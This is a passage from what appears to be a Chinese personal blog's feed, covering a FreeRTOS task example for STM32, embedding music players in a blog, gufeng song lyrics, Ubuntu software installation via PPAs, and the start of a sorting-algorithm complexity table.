<h3 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h3><p>经过以上步骤，系统移植工作已经完成，现在便可以创建多个任务，并启动任务调度器进行任务调度。</p>
<ul>
<li>在 &quot;main.h&quot; 添加 FreeRTOS 相关的头文件</li>
</ul>
<pre><code class="txt">#include &quot;FreeRTOS.h&quot;
#include &quot;task.h&quot;
#include &quot;queue.h&quot;
#include &quot;list.h&quot;
</code></pre>
<ul>
<li>编写任务</li>
</ul>
<pre><code class="C">// 定时亮灯任务
static void vLEDOnTask(void *pvParameters)
{
  TickType_t xLastWakeTime;
  const TickType_t xFrequency = 1000/portTICK_RATE_MS;

  /* xLastWakeTime需要被初始化为当前心跳计数值，此次赋值过后，
  该变量将在vTaskDelayUntil函数中自动更新 */
  xLastWakeTime = xTaskGetTickCount();

  while(1)
  {
    GPIO_ResetBits(GPIOB,LED_PORT);
    UARTSendByByter(&#39;1&#39;);

    vTaskDelayUntil(&amp;xLastWakeTime,xFrequency);
  }
}

// 定时灭灯任务
static void vLEDOffTask(void *pvParameters)
{
  while(1)
  {
        GPIO_SetBits(GPIOB,LED_PORT);
    UARTSendByByter(&#39;2&#39;);

      vTaskDelay(2000/portTICK_RATE_MS);
  }
}

// 定时串口发送任务
static void vUasrtSendTask(void *pvParameters)
{
  volatile unsigned char cnt=0;
  TaskHandle_t xTaskLedOffHandle = (TaskHandle_t)pvParameters;

  while(1)
  {
    UARTSendByByter(cnt++);
    if(xTaskLedOffHandle!=NULL)
    {
      if(cnt==50)
        vTaskSuspend(xTaskLedOffHandle);    // 挂起灭灯任务
      else if(cnt==100)
        vTaskResume(xTaskLedOffHandle);    // 唤醒灭灯任务
      else if(cnt==255)
      {
        vTaskDelete(xTaskLedOffHandle);    // 删除灭灯任务
        xTaskLedOffHandle=NULL;
      }
    }
    vTaskDelay(1500/portTICK_RATE_MS);
  }
}
</code></pre>
<ul>
<li>创建任务并启动调度器</li>
</ul>
<pre><code class="C">int main(void)
{
  TaskHandle_t xTaskLedOffHandle;    /* 定义灭灯任务句柄 */
  prvSetupHardware();            /* 设备初始化 */

  xTaskCreate(vLEDOffTask,           /* 指向任务函数的指针 */
      &quot;vLEDOffTask&quot;,           /* 任务的文本名字，只在调试中用到 */
      configMINIMAL_STACK_SIZE,   /* 分配的栈空间大小 */
      NULL,                 /* 没有给当前任务提供参数 */
      tskIDLE_PRIORITY+1,        /* 设置任务优先级 */
      &amp;xTaskLedOffHandle        /* 获取任务句柄，存入xTaskLedOffHandle */
      );
  xTaskCreate(vLEDOnTask, &quot;vLEDOnTask&quot;, configMINIMAL_STACK_SIZE, NULL, tskIDLE_PRIORITY+2, NULL);
  xTaskCreate(vUasrtSendTask, &quot;vUasrtSendTask&quot;, configMINIMAL_STACK_SIZE,
              (TaskHandle_t)(xTaskLedOffHandle), tskIDLE_PRIORITY+3, NULL);

  /* 启动任务调度器 */
  vTaskStartScheduler();

  return 0;
}
</code></pre>
<ul>
<li>功能测试</li>
</ul>
<p><img src="/assets/stm32/tasksTest.png" alt="任务测试结果"></p>
<p>从图中可以看出，16 进制数据 0x31, 0x32 交替出现，同时有一变量(假设为 y )从 0x01 逐一增至 0xff 后返回 0x01 继续增加，在 y 处于 0x32(50) 与 0x64(100) 之间时，0x32 暂停出现，后重新出现，直到 y 增至 0xff 后永不再现。此外，硬件部分，PB10 外接的 LED 也随着任务进行亮灭交替变换，最后保持在灯亮状态。</p>
<p><img src="/assets/stm32/ledOn.jpg" alt="LedOn"><br><img src="/assets/stm32/ledOff.jpg" alt="LedOff"></p>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> stm32 </tag>
            
            <tag> FreeRTOS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在博客中添加音乐]]></title>
      <url>https://www.litreily.top/2016/10/28/add-Music/</url>
      <content type="html"><![CDATA[<h2 id="音乐来源"><a href="#音乐来源" class="headerlink" title="音乐来源"></a>音乐来源</h2><p>现在要找个 <code>.mp3</code> 外链资源可真不容易，以往的酷狗歌曲信息里带着，现在也不见了，百度音乐下载也得用客户端，还不显示链接，各大音乐网站真是越来越小心了啊。</p>
<h3 id="网易云音乐"><a href="#网易云音乐" class="headerlink" title="网易云音乐"></a>网易云音乐</h3><p>想要从网站获取音乐链接的方法还是有的，比如说  <a href="http://music.163.com/#" target="_blank" rel="noopener">网易云音乐</a>  。使用Google/firefox/edge等带开发者工具的浏览器打开网易云音乐，搜索自己想要的音乐，并进行播放，然后打开开发者工具。开发工具打开方式：</p>
<ol>
<li>谷歌：右键点击  <strong>检查</strong>，或使用快捷键 <code>Ctrl+Shift+I</code> ;</li>
<li>edge：右键点击 <strong>检查元素</strong>/ <strong>查看源</strong>，或使用快捷键 <code>F12</code> ;</li>
<li>firefox：快捷键 <code>Shift+F2</code> 。</li>
</ol>
<p><img src="/assets/music/xishanyao.png" alt="网易云音乐"></p>
<p>以  <a href="http://music.163.com/#/song?id=405253647" target="_blank" rel="noopener">夕山谣</a>  为例，打开开发工具，找到  <code>Application</code> ，打开 <code>Frames/top/Media</code> 。</p>
<p><img src="/assets/music/xishanyaoLink.png" alt="开发工具"></p>
<p>右键选择&quot; Open link in new tab &quot; 或者 &quot; Copy link address &quot;，选取链接的前半部分,以 <code>.mp3</code> 结尾。得到链接：</p>
<pre><code class="yml">夕山谣
http://m10.music.126.net/20161028204714/808f68e0d3afc7d68d6945d0ce8336eb/ymusic/5a20/163f/3437/9a6871479b12bc82fff53821676faedc.mp3
</code></pre>
<h3 id="本地上传"><a href="#本地上传" class="headerlink" title="本地上传"></a>本地上传</h3><p>除了上述方法外，也可以手动制作音乐外链，当然，这需要借助于其它网站，比如  <a href="http://www.111ttt.com/up/" target="_blank" rel="noopener">www.111ttt.com/up/</a>  。在该网站上传已经下好的音乐文件，然后点击播放地址，在弹出的页面底部就有已生成的外链地址了。</p>
<p><img src="/assets/music/upFile.png" alt="上传音乐"></p>
<pre><code class="yml">Critty 杏花弦外雨
http://sc.111ttt.com/up/mp3/193721/278DF18856D56FEC6B4E6EDC15D97906.mp3
</code></pre>
<h3 id="七牛云存储"><a href="#七牛云存储" class="headerlink" title="七牛云存储"></a>七牛云存储</h3><p><a href="http://www.qiniu.com/" target="_blank" rel="noopener">七牛云</a> 作为国内领先的企业级云服务商，当然提供了最基本的云存储服务。当前可以免费注册并进行实名认证，之后可以获取 10GB 的免费存储空间。</p>
<p><img src="/assets/music/qiniuyunSpace.png" alt="七牛云免费空间"></p>
<p>注册并登录后，需要先创建一个空间，如 <code>litreily</code>，然后打开 <code>对象存储</code> &gt;&gt; <code>litreily</code> &gt;&gt; <code>内容管理</code>。此时便可上传文件，文件类型不限，我们可以将本地音乐文件上传后获取其外链地址。</p>
<p><img src="/assets/music/qiniuyunLink.png" alt="七牛云外链获取方法"></p>
<p>所得外链地址为：</p>
<pre><code class="yml">CRITTY - 轮回之境
http://ofx35z92m.bkt.clouddn.com/CRITTY%20-%20%E8%BD%AE%E5%9B%9E%E4%B9%8B%E5%A2%83.mp3
</code></pre>
<audio class="musicPlayer" src="http://ofx35z92m.bkt.clouddn.com/CRITTY%20-%20%E8%BD%AE%E5%9B%9E%E4%B9%8B%E5%A2%83.mp3" autoplay></audio>

<h2 id="音乐播放器"><a href="#音乐播放器" class="headerlink" title="音乐播放器"></a>音乐播放器</h2><h3 id="网易云音乐插件"><a href="#网易云音乐插件" class="headerlink" title="网易云音乐插件"></a>网易云音乐插件</h3><p>网易云音乐提供了外链播放器，官方提供的使用方法如下：</p>
<ol>
<li>在 <a href="http://music.163.com/" target="_blank" rel="noopener">music.163.com</a> 进入单曲、歌单、专辑、电台节目页面后，点击 “生成外链播放器” 链接。</li>
<li>歌单和专辑外链播放器可以选择大中小三种尺寸，单曲和电台节目可以选择中小两种尺寸。你可以选择最适合你网站设计的尺寸。</li>
<li>还可以选择是否要自动播放，打上勾后，别人访问网站时播放器会自动开始播放。</li>
<li>最后将播放器的代码黏贴到你的网站上，大功告成！</li>
</ol>
<p>[示例：杏花轩外雨]</p>
<p><img src="/assets/music/wlPlayer.png" alt="网易云音乐外链播放器"></p>
<p>[示例代码]</p>
<p><img src="/assets/music/wlDemo.png" alt="网易云音乐外链demo"></p>
<p>[示例说明]</p>
<ol>
<li>HTML源码中的 &quot; auto=1 &quot; 代表自动播放，改为0即可取消自动播放功能；</li>
<li>在markdown文件中引用该插件时，需要将 <code>iframe</code> 的 <code>width</code> 和 <code>height</code> 属性值用双引号包围起来，即 width=&quot;330&quot; height=&quot;86&quot; ,否则可能出现无法解析该代码的情况；</li>
<li>使用插件时可以添加一个类（如：class=&quot;musicPlayer&quot;），参考以下代码可以设置播放器的长宽。</li>
</ol>
<pre><code class="css">.musicPlayer{
    width: 100%;
    max-width: 500px;
}
</code></pre>
<p>[示例播放1：height=66 auto=1]</p>
<iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&id=32957012&auto=1&height=66"></iframe>

<pre><code class="html">&lt;iframe class=&quot;musicPlayer&quot; frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot;
height=&quot;86&quot; src=&quot;https://music.163.com/outchain/player?type=2&amp;id=32957012&amp;auto=0&amp;height=66&quot;&gt;&lt;/iframe&gt;
</code></pre>
<p>[示例播放2：height=32 auto=0]</p>
<iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="https://music.163.com/outchain/player?type=2&id=32548265&auto=0&height=32"></iframe>

<pre><code class="html">&lt;iframe class=&quot;musicPlayer&quot; frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;298&quot;
height=&quot;52&quot; src=&quot;https://music.163.com/outchain/player?type=2&amp;id=32548265&amp;auto=0&amp;height=32&quot;&gt;&lt;/iframe&gt;
</code></pre>
<h3 id="audio-js"><a href="#audio-js" class="headerlink" title="audio.js"></a>audio.js</h3><p><a href="https://kolber.github.io/audiojs/" target="_blank" rel="noopener">audio.js</a>是一款轻量级的音乐播放器，下载文件后，将文件夹 &quot;audiojs&quot; 放在网站文件目录中，通过以下代码的形式将该播放器引入网页中。</p>
<pre><code class="html">&lt;head&gt;
    ...
    &lt;script src=&quot;/audiojs/audio.min.js&quot;&gt;&lt;/script&gt;
    &lt;script&gt;
      audiojs.events.ready(function() {
        audiojs.createAll();
      });
    &lt;/script&gt;
    ...
&lt;/head&gt;

&lt;body&gt;
    ...
    &lt;!-- 音乐播放器位置 --&gt;
    &lt;!-- preload=&quot;auto&quot; 可以替换为 autoplay 或者 loop  --&gt;
    &lt;audio class=&quot;musicPlayer&quot; src=&quot;https://sc.111ttt.com/up/mp3/397401/2A97E1C49899C77A559BCD1E224FCBAB.mp3&quot;
    preload=&quot;auto&quot;&gt;&lt;/audio&gt;
    &lt;!-- 说明：使用该插件后，其脚本语言将自动为其添加以下内容：
        class=&quot;audiojs&quot; classname=&quot;audiojs&quot; id=&quot;audiojs_wrapper0&quot;
        如果一个页面中存在多个audiojs播放器，其id尾数将从0逐一增加
        通过css修改这些属性，我们可以改变播放器的外观 --&gt;
    ...
&lt;/body&gt;
</code></pre>
<p>[示例：杏花轩外雨，链接由上述1.2方式而得]</p>
<audio class="musicPlayer" src="https://sc.111ttt.com/up/mp3/397401/2A97E1C49899C77A559BCD1E224FCBAB.mp3" preload="auto"></audio>

<p>[示例html源码]</p>
<pre><code class="html">&lt;div class=&quot;audiojs   playing&quot; classname=&quot;audiojs&quot; id=&quot;audiojs_wrapper0&quot;&gt;
    &lt;audio class=&quot;musicPlayer&quot; src=&quot;https://sc.111ttt.com/up/mp3/397401/2A97E1C49899C77A559BCD1E224FCBAB.mp3&quot; preload=&quot;auto&quot;&gt;&lt;/audio&gt;
    &lt;div class=&quot;play-pause&quot;&gt;
        &lt;p class=&quot;play&quot;&gt;&lt;/p&gt;
        &lt;p class=&quot;pause&quot;&gt;&lt;/p&gt;
        &lt;p class=&quot;loading&quot;&gt;&lt;/p&gt;
        &lt;p class=&quot;error&quot;&gt;&lt;/p&gt;
    &lt;/div&gt;
    &lt;div class=&quot;scrubber&quot;&gt;
        &lt;div class=&quot;progress&quot; style=&quot;width: 167.146px;&quot;&gt;&lt;/div&gt;
        &lt;div class=&quot;loaded&quot; style=&quot;width: 280px;&quot;&gt;&lt;/div&gt;
    &lt;/div&gt;
    &lt;div class=&quot;time&quot;&gt;
        &lt;em class=&quot;played&quot;&gt;02:22&lt;/em&gt;/&lt;strong class=&quot;duration&quot;&gt;03:57&lt;/strong&gt;
    &lt;/div&gt;  
    &lt;div class=&quot;error-message&quot;&gt;&lt;/div&gt;
&lt;/div&gt;
</code></pre>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul>
<li><a href="http://www.ithome.com/html/it/195970.htm" target="_blank" rel="noopener">7 款高颜值 HTML5 播放器</a></li>
<li><a href="http://www.oschina.net/news/27466/html5-audio-players" target="_blank" rel="noopener">10 个基于 Web 的 HTML5 音乐播放器</a></li>
<li><a href="http://www.shejidaren.com/free-audio-players.html" target="_blank" rel="noopener">10 个免费开源的 JS 音乐播放器插件</a></li>
<li><a href="http://www.17sucai.com/pins/tag/3189.html" target="_blank" rel="noopener">播放器 jquery 特效代码</a></li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>网易云音乐的播放器插件使用方便，但是连接效率太低，经常获取不到资源或者获取速度过慢，而  audiojs  播放器虽然外观简陋些，但资源下载效率还不错，而且资源地址可以自定义，不会受限。所以，各有利弊，依情况而定吧。</p>
]]></content>
      
        <categories>
            
            <category> Media </category>
            
        </categories>
        
        
        <tags>
            
            <tag> music </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[优美的古风歌曲]]></title>
      <url>https://www.litreily.top/2016/10/27/antiquity-music/</url>
      <content type="html"><![CDATA[<h2 id="古风"><a href="#古风" class="headerlink" title="古风"></a>古风</h2><blockquote>
<p><a href="http://baike.baidu.com/subview/297/9729252.htm" target="_blank" rel="noopener">古风</a> 是一类新型的文化，是现代人对古代曲风的称呼。&quot;古风&quot; 以中国的传统文化为基调，结合中国传统的文学、琴棋书画、诗词歌赋等，经过不断的发展磨合，形成了比较完备的音乐、文学、绘画等艺术形式。</p>
</blockquote>
<h3 id="古风音乐社团"><a href="#古风音乐社团" class="headerlink" title="古风音乐社团"></a>古风音乐社团</h3><p><a href="http://www.mymmqm.com/" target="_blank" rel="noopener">墨明棋妙</a> <a href="http://5sing.kugou.com/lfmmusic/default.html" target="_blank" rel="noopener">鸾凤鸣</a> <a href="http://5sing.kugou.com/pingshaluoyan/default.html" target="_blank" rel="noopener">平纱落雁</a> <a href="http://music.163.com/#/user/home?id=64846286" target="_blank" rel="noopener">满汉全席</a> <a href="http://www.oyinyue.com/11388725" target="_blank" rel="noopener">声自在</a> <a href="http://5sing.kugou.com/qianchengzuige/default.html" target="_blank" rel="noopener">千城醉歌</a> <a href="http://5sing.kugou.com/liushangqushui/default.html" target="_blank" rel="noopener">流觞曲水</a> <a href="http://5sing.kugou.com/5590972/default.html" target="_blank" rel="noopener">花魁楼</a> <a href="http://5sing.kugou.com/qiange/default.html" target="_blank" rel="noopener">千歌未央</a> <a href="http://5sing.kugou.com/27373394/default.html" target="_blank" rel="noopener">云歌落</a></p>
<h3 id="古风音乐人"><a href="#古风音乐人" class="headerlink" title="古风音乐人"></a>古风音乐人</h3><p><a href="http://www.xiami.com/artist/68934" target="_blank" rel="noopener">河图</a> <a href="http://www.xiami.com/artist/52636" target="_blank" rel="noopener">董贞</a> <a href="http://www.xiami.com/artist/98637" target="_blank" rel="noopener">小曲儿</a> <a href="http://www.xiami.com/artist/103550" target="_blank" rel="noopener">少司命</a> <a href="http://y.baidu.com/qingnong914" target="_blank" rel="noopener">清弄</a> <a href="http://bd.kuwo.cn/mingxing/%E6%BD%87%E6%A2%A6%E4%B8%B4.htm?from=baidu" target="_blank" rel="noopener">潇梦临</a> <a href="http://www.xiami.com/artist/87301" target="_blank" rel="noopener">檀烧</a> <a href="http://www.xiami.com/artist/65156" target="_blank" rel="noopener">心然</a> <a href="http://www.xiami.com/artist/55553" target="_blank" rel="noopener">萧人凤</a> <a href="http://bd.kuwo.cn/mingxing/%E5%87%8C%E4%B9%8B%E8%BD%A9.htm?from=baidu" target="_blank" rel="noopener">凌之轩</a> <a href="http://i.xiami.com/huanger117" target="_blank" rel="noopener">晃儿</a> <a href="http://www.xiami.com/artist/102392" target="_blank" rel="noopener">重小烟</a> <a href="http://www.xiami.com/artist/80464" target="_blank" rel="noopener">音频怪物</a></p>
<h3 id="古风网站"><a href="#古风网站" class="headerlink" title="古风网站"></a>古风网站</h3><p><a href="http://5sing.kugou.com/" target="_blank" rel="noopener">5sing</a> <a href="http://xingmaow.com/" target="_blank" rel="noopener">古风杏猫网</a> <a href="http://www.gufengquan.com/" target="_blank" rel="noopener">古风圈论坛</a></p>
<h2 id="古风歌曲品鉴"><a href="#古风歌曲品鉴" class="headerlink" title="古风歌曲品鉴"></a>古风歌曲品鉴</h2><h3 id="杏花弦外雨"><a href="#杏花弦外雨" class="headerlink" title="杏花弦外雨"></a>杏花弦外雨</h3><blockquote>
<p><a href="http://baike.baidu.com/subview/10846918/19226803.htm" target="_blank" rel="noopener">杏花弦外雨</a>  是由  潇梦临  作曲及编曲，若紫鸢作词，由  <a href="http://baike.baidu.com/view/3113695.htm" target="_blank" rel="noopener">西国的海妖</a>、<a href="http://baike.baidu.com/view/8616563.htm" target="_blank" rel="noopener">CRITTY</a>  演唱的一首优质古风歌曲。收录在CRITTY的《弦上春雪》原创古风非实体专辑中。MV由尉迟嘉馨制作，展现了江南水乡的美丽风景，讲述了西厢记中一段才子佳人相思空守的故事。</p>
</blockquote>
<iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&id=32957012&auto=0&height=66"></iframe>

<pre><code class="txt">作曲/编曲：潇梦临
作词：若紫鸢
演唱：西国的海妖、CRITTY

流莺悄飞近船侧  伴桨声低语浅说
柳梢沾绿了烟波  绕堤三分春色
旧书翻入寻常调  隔岸依稀吴越歌
反复着几回啼笑  往来几段离合
有书生翩翩风流  有佳人独坐楼阁
有一日擦肩而过  惹来两情脉脉
诗文里风月渐浓  只不见天长地久
心事落在琴弦外  又与谁轻轻说
说那年烟雨空濛  杏花船摇摆而过
过谁家楼台  一声弦歌拂落

他素白衣着  山水间几程远游
堪折何折年年柳色
当柳梢下的集句  尽数流过眼底
拈一缕春风浅浅作序
待到行间字里
再不是眼前朝夕
曲中人早已离题
当一阵阵临窗雨  洗旧那时心绪
曲中人远隔千里万里  不知不觉的停笔
留下余韵待续  就在那片烟波外淡成了迤逦

后来事不知如何  那佳人还在楼阁
独对着雨帘萧瑟  一字一句斟酌
诗文里风月残留  不经意换了角色
陈词落在琴弦外  还有谁轻轻说
说那年烟雨空濛  杏花船摇摆而过
过谁家楼台  一声弦歌落寞

她等过几番  绵绵飞絮亦白头
空折还折年年柳色
当柳梢下的集句  尽数流过眼底
拈一缕春风浅浅作序  待到行间字里
再不是眼前朝夕  曲中人早已离题
当一阵阵临窗雨  洗旧那时心绪
曲中人远隔千里万里  不知不觉的停笔
留下余韵待续  就在那片烟波外淡成了迤逦
</code></pre>
<p><img src="/assets/music/xinghuaxianwaiyu.png" alt="杏花弦外雨"></p>
<h3 id="遇萤"><a href="#遇萤" class="headerlink" title="遇萤"></a>遇萤</h3><blockquote>
<p>由  YT君  制作的橙光文字游戏《逆袭之星途闪耀》的剧中剧《遇龙》的主题曲《遇萤》。  <a href="http://baike.baidu.com/item/%E9%81%87%E8%90%A4" target="_blank" rel="noopener">遇萤</a>  是<a href="http://baike.baidu.com/view/8616563.htm" target="_blank" rel="noopener">CRITTY</a> 演唱歌曲，由执素兮作曲，顾聆落作词。</p>
</blockquote>
<iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&id=32548265&auto=0&height=66"></iframe>

<pre><code class="txt">演唱：CRITTY
    歌曲监制：我是YT
    作曲/策划/和声编写：执素兮
    作词：顾聆落
    编曲：潇梦临

    尉迟龙炎(龙王)：既然你叫流萤...
    那不如…
    不如我就赠你漫天流萤吧…

    若千年的光阴 轮回里
　　是否只为寻觅着你
　　恍若所有月明
　　圆缺或是阴晴 都只为了你
　　尘缘似一场花雨
　　眉目缱绻中枯寂
　　指间的瞬息
　　拾得你一颗泪滴
　　若忘川的涟漪 随我心
　　是否只为不忘记你
　　恍若所有思绪
　　怜惜或是悲戚 都只为了你
　　尘缘似一场烟影
　　眉目缱绻中飘零
　　心之所寄
　　劫数应声而起

　　前生今世来生
　　与你相遇 在每一个梦里
　　拂袖唤漫天流萤
　　掌心微光谁眼中倒映
　　回眸不舍离去
　　此情为你 在心上停栖
　　下一世 再与你永不分离

    尉迟龙炎(龙王)：只是从今往后，
    你都要学会自己一个人...
    勇敢走下去，即便没有我，也不要害怕…

    若忘川的涟漪 随我心
　　是否只为不忘记你
　　恍若所有思绪
　　怜惜或是悲戚 都只为了你
　　尘缘似一场流萤
　　眉目缱绻中宁静
　　照谁前行
　　灿若彻夜繁星
　　前生今世来生
　　与你相遇 在每一个梦里
　　拂袖唤漫天流萤
　　掌心微光谁眼中倒映
　　回眸不舍离去
　　此情为你 在心上停栖
　　下一世 再与你永不分离

　　前生今世来生
　　与你相遇 在每一个梦里
　　拂袖唤漫天流萤
　　掌心微光谁眼中倒映
　　回眸不舍离去
　　此情为你 在心上停栖
　　这一世 愿与你共存天地
　　这一世 愿与你共存天地
</code></pre>
<p><img src="/assets/music/yuying.png" alt="遇萤"></p>
<h3 id="倾尽天下"><a href="#倾尽天下" class="headerlink" title="倾尽天下"></a>倾尽天下</h3><blockquote>
<p>倾尽天下 是音乐团队 <a href="http://baike.baidu.com/view/1204149.htm" target="_blank" rel="noopener">墨明棋妙</a> 创作的古风歌曲，由 <a href="http://baike.baidu.com/subview/649792/11273294.htm" target="_blank" rel="noopener">finale</a> 作词，<a href="http://baike.baidu.com/subview/4151/9915126.htm" target="_blank" rel="noopener">河图</a> 作曲、编曲并演唱。</p>
</blockquote>
<iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&id=27571867&auto=0&height=66"></iframe>

<pre><code class="txt">作词：Finale
作曲/编曲/演唱：河图

刀戟声共丝竹沙哑
谁带你看城外厮杀
七重纱衣 血溅了白纱
兵临城下六军不发
谁知再见已是 生死无话
当时缠过红线千匝
一念之差作为人嫁
那道伤疤 谁的旧伤疤
还能不动声色饮茶
踏碎这一场 盛世烟花
血染江山的画
怎敌你眉间 一点朱砂
覆了天下也罢
始终不过 一场繁华
碧血染就桃花
只想再见 你泪如雨下
听刀剑喑哑
高楼奄奄一息 倾塌

是说一生命犯桃花
谁为你算的那一卦
最是无瑕风流不假
画楼西畔 反弹琵琶
暖风处处 谁心猿意马
色授魂与颠倒容华
兀自不肯相对照蜡
说爱折花 不爱青梅竹马
到头来算的那一卦
终是为你 覆了天下
明月照亮天涯
最后谁又得到了蒹葭
江山嘶鸣战马
怀抱中那寂静的喧哗
风过天地肃杀
容华谢后 君临天下
登上九重宝塔
皇妃 朱砂
皇妃 朱砂
看一夜流星飒沓
回到那一刹那
岁月无声也让人害怕
枯藤长出枝桠
原来时光已翩然轻擦
梦中楼上月下
站着眉目依旧的你啊
拂去衣上雪花
并肩看 天地浩大
回到那一刹那
岁月无声也让人害怕
枯藤长出枝桠
原来时光已翩然轻擦
梦中楼上月下
站着眉目依旧的你啊
拂去衣上雪花
并肩看 天地浩大
梦中楼上月下
站着眉目依旧的你啊
拂去衣上雪花
并肩看 天地浩大
</code></pre>
<p><img src="/assets/music/qingjintianxia.png" alt="倾尽天下"></p>
<h2 id="播放列表"><a href="#播放列表" class="headerlink" title="播放列表"></a>播放列表</h2><iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="https://music.163.com/outchain/player?type=0&id=2310717269&auto=0&height=430"></iframe>
]]></content>
      
        <categories>
            
            <category> Media </category>
            
        </categories>
        
        
        <tags>
            
            <tag> music </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu下安装常用软件]]></title>
      <url>https://www.litreily.top/2016/10/12/installSW/</url>
      <content type="html"><![CDATA[<h2 id="apt-get-install"><a href="#apt-get-install" class="headerlink" title="apt-get install"></a>apt-get install</h2><h3 id="Atom"><a href="#Atom" class="headerlink" title="Atom"></a>Atom</h3><pre><code class="bash">sudo add-apt-repository ppa:webupd8team/atom
sudo apt-get update  
sudo apt-get install atom
</code></pre>
<p><code>add-apt-repository</code>用于添加软件源，<code>apt-get update</code>用于更新软件源，更新后即可使用<code>apt-get install</code>安装所需的软件。</p>
<h3 id="Sublime-Text-3"><a href="#Sublime-Text-3" class="headerlink" title="Sublime Text 3"></a>Sublime Text 3</h3><pre><code class="bash">sudo add-apt-repository ppa:webupd8team/sublime-text-3  
sudo apt-get update  
sudo apt-get install sublime-text-install
</code></pre>
<h2 id="添加快捷方式"><a href="#添加快捷方式" class="headerlink" title="添加快捷方式"></a>添加快捷方式</h2><p>在Ubuntu下，有些deb安装包，安装完成后只能通过终端启动，而且不能关闭终端，为此，我们可以给应用程序添加快捷方式。</p>
<pre><code class="bash">sudo vim /usr/share/applications/appName.desktop
</code></pre>
<p>以eclipse为例在新添加的文件<code>eclipse.desktop</code>中添加以下内容：</p>
<pre><code class="yml">[Desktop Entry]  
Type=application  
Name=eclipse  
Commit=Eclipse Integrated Development Environment  
Exec=/opt/eclipse/eclipse  
Icon=/opt/eclipse/icon.xpm  
Terminal=false  
StartupNotify=true  
Categories=Development;IDE;Java;
</code></pre>
<p>其中Exec指定应用路径，Icon指定应用图标，Categories用于分类。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> atom </tag>
            
            <tag> ubuntu </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[常用的排序算法]]></title>
      <url>https://www.litreily.top/2016/09/20/algor-sort/</url>
      <content type="html"><![CDATA[<h2 id="算法复杂度及稳定性"><a href="#算法复杂度及稳定性" class="headerlink" title="算法复杂度及稳定性"></a>算法复杂度及稳定性</h2><table>
<thead>
<tr>
<th style="text-align:center">排序方法</th>
<th style="text-align:center">最好时间</th>
<th style="text-align:center">平均时间</th>
<th style="text-align:center">最坏时间</th>
<th style="text-align:center">辅助空间</th>
<th style="text-align:center">稳定性</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">直接插入</td>
<td style="text-align:center">O(n)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(1)</td>
<td style="text-align:center">稳定</td>
</tr>
<tr>
<td style="text-align:center">二分插入</td>
<td style="text-align:center">O(n)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(1)</td>
<td style="text-align:center">稳定</td>
</tr>
<tr>
<td style="text-align:center">希尔</td>
<td style="text-align:center"></td>
<td style="text-align:center">O(n^1.25)</td>
<td style="text-align:center"></td>
<td style="text-align:center">O(1)</td>
<td style="text-align:center">不稳定</td>
</tr>
<tr>
<td style="text-align:center">冒泡</td>
<td style="text-align:center">O(n)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(1)</td>
<td style="text-align:center">稳定</td>
</tr>
<tr>
<td style="text-align:center">快速</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(lgn)</td>
<td style="text-align:center">不稳定</td>
</tr>
<tr>
<td style="text-align:center">直接选择</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(1)</td>
<td style="text-align:center">不稳定</td>
</tr>
<tr>
<td style="text-align:center">堆</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center"></td>
<td style="text-align:center">不稳定</td>
</tr>
<tr>
<td style="text-align:center">归并</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(n)</td>
<td style="text-align:center">稳定</td>
</tr>
<tr>
<td style="text-align:center">基数</td>
<td style="text-align:center">O(d(rd+n))</td>
<td style="text-align:center">O(d(rd+n))</td>
<td style="text-align:center">O(d(rd+n))</td>
<td style="text-align:center">O(rd+n)</td>
<td style="text-align:center">稳定</td>
</tr>
</tbody>
</table>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><h3 id="直接插入"><a href="#直接插入" class="headerlink" title="直接插入"></a>直接插入</h3><h4 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h4><ol>
<li>将序列的第一个元素作为<strong>有序序列</strong>，第二个元素直至最后一个元素作为<strong>待排序序列</strong>;</li>
<li>从前往后依次扫描<strong>待排序序列</strong>，将扫描的元素依次插入到<strong>有序序列</strong>的适当位置。</li>
</ol>
